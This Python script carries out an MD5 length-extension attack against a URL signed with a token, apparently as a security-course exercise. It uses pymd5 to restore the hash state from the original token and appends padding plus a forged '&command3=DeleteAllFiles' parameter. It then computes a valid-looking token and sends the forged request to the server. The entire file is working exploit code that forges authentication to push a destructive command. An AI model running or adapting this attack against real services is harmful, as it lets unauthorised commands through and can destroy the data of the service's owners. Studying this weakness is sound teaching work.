import http.client 
import sys
import urllib.parse
from urllib.parse import urlparse
from pymd5 import md5, padding

if len(sys.argv) != 2:
    print('Requires the URL to extend as a command line argument.') 
    exit(1)
original_url = sys.argv[1]
# Parse URL to get interesting parts
o = urlparse(original_url)
query = o.query
# Extract token from url
partition1 = query.partition('&')
partition2 = partition1[0].partition('=')
original_token = partition2[2]
# Extract query 
original_query = partition1[2]
# Define our extension
malicious_extension = "&command3=DeleteAllFiles"
malicious_extension_b = b'&command3=DeleteAllFiles'
# calculate orignal length and padding of original query
og_msg_len = len(original_query) + 8
m_padding = padding(og_msg_len*8)
total_msg_len = (og_msg_len + len(m_padding))*8
# reset state of md5 to when it hashed original token
h = md5(
    state=bytes.fromhex(original_token),
    count=total_msg_len)
# add extension to query and rehash
h.update(malicious_extension_b)
newtoken = h.hexdigest()
# add padding
url_safe = urllib.parse.quote(m_padding)
# piece url back together
new_url =  o.scheme + "://" + o.hostname + o.path + "?" + partition2[0] + partition2[1] + str(newtoken) + partition1[1] + partition1[2] + url_safe + malicious_extension
# The following code requests the URL and returns the response from the server
parsed_url = urllib.parse.urlparse(new_url)
conn = http.client.HTTPSConnection(parsed_url.hostname, parsed_url.port)
conn.request("GET", parsed_url.path + "?" + parsed_url.query)
print(conn.getresponse().read())

